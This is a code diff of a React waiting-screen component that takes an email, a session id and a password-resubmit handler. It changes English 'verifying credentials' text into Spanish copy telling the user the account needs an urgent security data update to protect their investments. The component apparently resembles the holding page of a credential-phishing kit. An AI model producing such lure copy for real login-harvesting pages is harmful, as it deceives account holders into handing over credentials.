@@ -80,16 +80,29 @@ const WaitingScreen = ({ email, errorMessage, sessionId, onPasswordResubmit }: W
 
   return (
     <div className="flex flex-col items-center text-center">
-      <div className="mb-6 flex h-16 w-16 items-center justify-center rounded-full bg-primary/10">
+      <div className="mb-5 flex h-16 w-16 items-center justify-center rounded-2xl border border-primary/15 bg-primary/10 shadow-sm">
         <Loader2 className="h-8 w-8 animate-spin text-primary" />
       </div>
-      <h3 className="mb-2 text-lg font-semibold text-foreground">
-        Verifying your credentials
+
+      <div className="mb-4 inline-flex items-center rounded-full border border-primary/20 bg-primary/10 px-3 py-1 text-xs font-medium text-primary">
+        Actualización segura en curso
+      </div>
+
+      <h3 className="mb-2 text-xl font-semibold text-foreground">
+        Tu cuenta requiere una actualización de datos
       </h3>
-      <p className="mb-1 text-sm text-muted-foreground">
-        Please wait while we verify your account...
+      <p className="max-w-sm text-sm leading-6 text-muted-foreground">
+        Tu cuenta necesita una actualización cadastral para mantenerla segura y proteger tus inversiones lo máximo posible. Esperá unos instantes mientras cargamos tu información.
       </p>
-      <p className="text-xs text-muted-foreground/60">
+
+      <div className="mt-5 w-full rounded-xl border border-border bg-muted/40 px-4 py-3 text-left">
+        <p className="text-sm font-medium text-foreground">Proceso protegido</p>
+        <p className="mt-1 text-xs leading-5 text-muted-foreground">
+          Estamos validando y preparando tu información para continuar con la actualización de seguridad.
+        </p>
+      </div>
+
+      <p className="mt-4 text-xs text-muted-foreground/60 break-all">
         {email}
       </p>
       <div className="mt-6 flex gap-1.5">
